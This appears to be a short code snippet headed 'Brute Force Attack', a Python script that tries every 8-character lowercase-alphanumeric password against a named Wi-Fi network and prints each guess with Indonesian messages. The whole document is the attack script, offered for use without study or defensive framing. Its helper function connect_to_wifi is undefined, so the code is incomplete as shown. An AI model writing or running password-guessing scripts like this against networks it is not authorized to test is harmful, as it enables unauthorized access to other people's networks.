# aTTACK-
Brute Force Attack
import itertools

def brute_force(ssid, char_set):
    for password in itertools.product(char_set, repeat=8):
        password = ''.join(password)
        if connect_to_wifi(ssid, password):
            print("Password ditemukan:", password)
            return
        else:
            print("Password salah:", password)

ssid = "Nama_Wifi"
char_set = "abcdefghijklmnopqrstuvwxyz0123456789"

brute_force(ssid, char_set)
